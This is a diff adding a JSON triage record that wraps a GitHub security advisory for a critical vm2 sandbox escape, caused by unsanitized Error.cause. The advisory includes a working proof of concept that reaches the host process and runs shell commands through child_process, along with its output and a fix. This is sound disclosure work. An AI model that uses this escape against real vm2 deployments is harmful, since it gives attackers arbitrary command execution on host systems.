@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/58337987?v=4\", \"events_url\": \"https://api.github.com/users/VladimirEliTokarev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/VladimirEliTokarev/followers\", \"following_url\": \"https://api.github.com/users/VladimirEliTokarev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/VladimirEliTokarev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/VladimirEliTokarev\", \"id\": 58337987, \"login\": \"VladimirEliTokarev\", \"node_id\": \"MDQ6VXNlcjU4MzM3OTg3\", \"organizations_url\": \"https://api.github.com/users/VladimirEliTokarev/orgs\", \"received_events_url\": \"https://api.github.com/users/VladimirEliTokarev/received_events\", \"repos_url\": \"https://api.github.com/users/VladimirEliTokarev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/VladimirEliTokarev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/VladimirEliTokarev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/VladimirEliTokarev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-47686\", \"cvss\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"**Affected:** vm2 <= 3.11.3\\n**CVSS 3.1:** 9.9 HIGH (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)\\n**CWE:** CWE-693 (Protection Mechanism Failure)\\n**Prerequisite:** Embedder exposes a host function that throws an Error with `.cause` referencing a powerful host object (e.g., `process`)\\n\\n## Summary\\n\\nI found that `handleException()` in `lib/setup-sandbox.js` recursively sanitizes sub-errors for `SuppressedError` and `AggregateError`, but completely ignores the ES2022 `Error.cause` property. When sandbox code catches a host-thrown error carrying a `.cause` that references a host object like `process`, it can traverse that reference to achieve arbitrary command execution on the host.\\n\\nThe project's own `docs/ATTACKS.md` (Defense Invariant #3, line 54) explicitly claims Error.cause is sanitized. The implementation does not match this claim.\\n\\n## Root Cause\\n\\nThe `handleException` function (lines 869-959 of `lib/setup-sandbox.js`) walks the prototype chain of caught errors looking for `SuppressedError` and `AggregateError`. When it finds them, it recursively sanitizes their contained errors (`.error`, `.suppressed`, `.errors[]`). For all other error types, it returns `e` directly at line 958 without inspecting `.cause`.\\n\\n```javascript\\nfunction handleException(e, visited) {\\n    e = ensureThis(e);\\n    if (e === null || (typeof e !== 'object' && typeof e !== 'function')) return e;\\n    // ... cycle detection ...\\n    while (proto !== null) {\\n        if (proto === localSuppressedErrorProto) {\\n            e.error = handleException(e.error, visited);      // sanitized\\n            e.suppressed = handleException(e.suppressed, visited); // sanitized\\n            return e;\\n        }\\n        if (proto === localAggregateErrorProto) {\\n            // sanitizes e.errors[] ...\\n            return e;\\n        }\\n        proto = localReflectGetPrototypeOf(proto);\\n    }\\n    return e; // .cause is NEVER checked\\n}\\n```\\n\\nError.cause was introduced in ES2022 (Node 16.9+). When `handleException` was extended to cover `SuppressedError` (for ES2024 `using` declarations) and `AggregateError`, the `.cause` property was simply overlooked.\\n\\n## Affected Code\\n\\n- `lib/setup-sandbox.js:869-959`, the `handleException` function (missing `.cause` handling)\\n- `lib/setup-sandbox.js:886`, `ensureThis` wraps the error but does not recurse into `.cause`\\n- `docs/ATTACKS.md:54`, Defense Invariant #3 falsely claims `.cause` is covered\\n\\n## Reproduction\\n\\nEmbedder code that exposes a function throwing with `.cause` set to `process`:\\n\\n```javascript\\nconst { VM } = require('vm2');\\n\\nconst vm = new VM({\\n    sandbox: {\\n        hostFn: () => {\\n            throw new Error('fail', { cause: process });\\n        }\\n    }\\n});\\n\\nconst result = vm.run(`\\n    try {\\n        hostFn();\\n    } catch (e) {\\n        // .cause is not sanitized, so we get a direct reference to host process\\n        const proc = e.cause;\\n        proc.mainModule.require('child_process').execSync('id').toString();\\n    }\\n`);\\n\\nconsole.log(result);\\n```\\n\\nVerified output:\\n\\n```\\nuid=502(vladimir.tokarev) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...\\n```\\n\\nFull RCE confirmed.\\n\\n## Impact\\n\\nAny application using vm2 where an embedder-exposed function throws an Error with `.cause` referencing a host object is vulnerable. The attacker gains:\\n\\n- Full host process access (read/write files, spawn processes, network access)\\n- Sandbox escape with changed scope (CVSS S:C)\\n- No user interaction required\\n\\nThe prerequisite (embedder throwing with `.cause`) is increasingly common. Error chaining via `new Error('msg', { cause: originalError })` is standard practice in modern Node.js code. Library wrappers, database adapters, and HTTP clients routinely chain errors this way.\\n\\n## Suggested Fix\\n\\nAdd `.cause` sanitization before the prototype-chain walk, so it applies to all error types:\\n\\n```javascript\\nfunction handleException(e, visited) {\\n    e = ensureThis(e);\\n    if (e === null || (typeof e !== 'object' && typeof e !== 'function')) return e;\\n    if (!visited) visited = new LocalWeakMap();\\n    if (apply(localWeakMapGet, visited, [e])) return e;\\n    apply(localWeakMapSet, visited, [e, true]);\\n\\n    // Sanitize .cause on ALL errors (ES2022)\\n    try {\\n        if ('cause' in e) {\\n            e.cause = handleException(e.cause, visited);\\n        }\\n    } catch (ex) { /* best effort */ }\\n\\n    let proto = localReflectGetPrototypeOf(e);\\n    while (proto !== null) {\\n        if (proto === localSuppressedErrorProto) {\\n            e.error = handleException(e.error, visited);\\n            e.suppressed = handleException(e.suppressed, visited);\\n            return e;\\n        }\\n        if (proto === localAggregateErrorProto) {\\n            if (localArrayIsArray(e.errors)) {\\n                for (let i = 0; i < e.errors.length; i++) {\\n                    e.errors[i] = handleException(e.errors[i], visited);\\n                }\\n            }\\n            return e;\\n        }\\n        proto = localReflectGetPrototypeOf(proto);\\n    }\\n    return e;\\n}\\n```\\n\\n`docs/ATTACKS.md` Defense Invariant #3 should also be updated to reflect reality until this fix ships.\\n\\n## Artifacts\\n\\n| File | Role |\\n|------|------|\\n| `poc_error_cause_escape.js` | PoC demonstrating sandbox escape to RCE via unsanitized `.cause` |\\n[poc_error_cause_escape.js](https://github.com/user-attachments/files/27952274/poc_error_cause_escape.js)\", \"ghsa_id\": \"GHSA-m283-3h24-438v\", \"github_reviewed_at\": \"2026-08-17T17:32:34Z\", \"html_url\": \"https://github.com/advisories/GHSA-m283-3h24-438v\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-m283-3h24-438v\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-47686\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-17T17:32:34Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-m283-3h24-438v\", \"https://github.com/patriksimek/vm2/releases/tag/3.11.6\", \"https://github.com/advisories/GHSA-m283-3h24-438v\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-m283-3h24-438v\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"VM2 has Missing Error.cause Sanitization that Enables Sandbox Escape to RCE\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-17T17:32:35Z\", \"url\": \"https://api.github.com/advisories/GHSA-m283-3h24-438v\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.6\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.11.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-m283-3h24-438v",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.11.5"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-47686"
+    ],
+    "cvss_score": 9.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-08-17T19:17:27.176241Z",
+  "provenance": {
+    "content_sha256": "f070ed37b553cc965f01970b58fc255866585a72074d2f0f3c722e92bc3d82e6",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-17T17:32:34Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-m283-3h24-438v",
+  "status": "active",
+  "title": "VM2 has Missing Error.cause Sanitization that Enables Sandbox Escape to RCE",
+  "updated_at": "2026-08-17T17:32:35Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-m283-3h24-438v"
+}
